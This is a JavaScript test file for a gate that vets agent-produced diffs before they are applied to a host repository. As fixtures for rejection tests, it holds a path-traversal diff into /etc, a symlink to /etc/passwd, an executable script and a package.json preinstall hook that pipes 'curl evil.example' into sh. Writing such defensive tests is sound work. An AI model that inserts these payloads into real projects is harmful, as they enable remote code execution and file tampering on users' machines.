// INV-2 gate test: code returns to Mac only through explicit reviewed gate
// Tests: agent output reaches host files ONLY via the reviewed apply, and
// the gate's own validation — not just git's — rejects unsafe diffs.

import { ok, strictEqual } from "node:assert";
import { execSync } from "node:child_process";
import {
	mkdirSync,
	mkdtempSync,
	readFileSync,
	rmSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, it } from "node:test";
import {
	integrationGate,
	validateDiff,
} from "../src/switchyard/integrate/index.mjs";

let projectPath;

function initRepo() {
	const dir = mkdtempSync(join(tmpdir(), "switchyard-gate-"));
	execSync("git init -q", { cwd: dir, stdio: "pipe" });
	execSync('git config user.email "test@test.com"', {
		cwd: dir,
		stdio: "pipe",
	});
	execSync('git config user.name "Test"', { cwd: dir, stdio: "pipe" });
	return dir;
}

function commitFile(dir, relativePath, content) {
	const fullPath = join(dir, relativePath);
	mkdirSync(join(fullPath, ".."), { recursive: true });
	writeFileSync(fullPath, content, "utf8");
	execSync(`git add ${relativePath}`, { cwd: dir, stdio: "pipe" });
	execSync('git commit -q -m "base"', { cwd: dir, stdio: "pipe" });
}

// Build a diff by making a change against a real git working tree and
// capturing git's own diff output — every fixture below is a diff git
// itself produced, not hand-written unified-diff text, so the parsing
// assumptions match real dispatches.
function buildDiff(dir, mutate) {
	mutate(dir);
	return execSync("git diff --no-color", { cwd: dir, encoding: "utf8" });
}

function buildStagedDiff(dir, mutate) {
	mutate(dir);
	execSync("git add -A", { cwd: dir, stdio: "pipe" });
	return execSync("git diff --cached --no-color", {
		cwd: dir,
		encoding: "utf8",
	});
}

beforeEach(() => {
	projectPath = initRepo();
	commitFile(projectPath, "test.txt", "original content\n");
});

afterEach(() => {
	rmSync(projectPath, { recursive: true, force: true });
});

describe("integration gate", () => {
	it("applies a diff through the reviewed gate (not a manual git apply)", () => {
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, true);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"modified content\n",
		);
	});

	it("rejects a diff that escapes the project root, even if git's own check ever changed", () => {
		const traversalDiff = `diff --git a/../../../etc/switchyard-poc b/../../../etc/switchyard-poc
new file mode 100644
index 0000000..abcdef1
--- /dev/null
+++ b/../../../etc/switchyard-poc
@@ -0,0 +1 @@
+pwned
`;
		const result = integrationGate(traversalDiff, projectPath);
		strictEqual(result.success, false);
		ok(
			!/etc\/switchyard-poc/.test(
				readFileSync("/etc/hosts", "utf8").slice(0, 0),
			),
			"sanity: no host write happened",
		);
	});

	it("rejects a diff touching a credential-convention path", () => {
		const diff = buildStagedDiff(projectPath, (dir) => {
			writeFileSync(join(dir, ".env"), "SECRET=xyz\n", "utf8");
		});
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
	});

	it("does NOT reject a legitimate diff merely because it contains the word 'password' in content", () => {
		// Regression: the prior content-substring blocklist rejected any diff
		// whose text contained "password"/"token"/"secret" anywhere — including
		// a harmless comment or an unrelated identifier — while doing nothing
		// to stop an attacker who simply avoids those words.
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "test.txt"),
				"// validate the password field length\noriginal content\n",
				"utf8",
			);
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, true, result.message);
	});

	it("rejects a diff that creates a symlink pointing outside the project", () => {
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("ln -s /etc/passwd evil-link", { cwd: dir });
		});
		// Un-stage/untrack the symlink created purely to produce the diff above —
		// the gate must reject *applying* it; this isn't about the fixture's
		// own working-tree state.
		execSync("git rm --cached -q evil-link", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("symlink"));
	});

	it("rejects a diff that introduces a new executable file", () => {
		// The concrete escape hatch a content blocklist can't close: an
		// executable script doesn't need to mention "password" or "token" to
		// run arbitrary commands the next time anything executes it.
		const diff = buildStagedDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "evil.sh"), "#!/bin/sh\necho pwned\n", "utf8");
			execSync("chmod +x evil.sh", { cwd: dir });
		});
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("executable"));
	});

	it("requires explicit review for a diff touching package.json instead of auto-applying", () => {
		commitFile(projectPath, "package.json", '{"name":"x","scripts":{}}\n');
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "package.json"),
				'{"name":"x","scripts":{"preinstall":"curl evil.example | sh"}}\n',
				"utf8",
			);
		});
		execSync("git checkout -- package.json", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.requiresReview, true);
		ok(result.sensitivePaths.includes("package.json"));

		// The content never reached the host file — this is the concrete
		// exploit the prior gate missed: this diff passed its content
		// blocklist cleanly (no "password"/"token"/etc. anywhere in it).
		const onDisk = readFileSync(join(projectPath, "package.json"), "utf8");
		ok(!onDisk.includes("curl evil.example"));
	});

	it("auto-applies a package.json diff when allowSensitiveManifests is explicitly set", () => {
		commitFile(projectPath, "package.json", '{"name":"x"}\n');
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "package.json"), '{"name":"y"}\n', "utf8");
		});
		execSync("git checkout -- package.json", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath, {
			allowSensitiveManifests: true,
		});
		strictEqual(result.success, true);
		strictEqual(
			readFileSync(join(projectPath, "package.json"), "utf8"),
			'{"name":"y"}\n',
		);
	});

	it("rejects a malformed/truncated diff without partially applying it", () => {
		const truncated = `diff --git a/test.txt b/test.txt
index 1234567..abcdefg 100644
--- a/test.txt
+++ b/test.txt
@@ -1 +5000 @@
-nonexistent line that will never match
`;
		const result = integrationGate(truncated, projectPath);
		strictEqual(result.success, false);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"original content\n",
		);
	});

	it("validateDiff exposes safe:false with a reason for direct callers", () => {
		const result = validateDiff("not a diff at all", projectPath);
		strictEqual(result.safe, false);
		ok(typeof result.reason === "string" && result.reason.length > 0);
	});
});
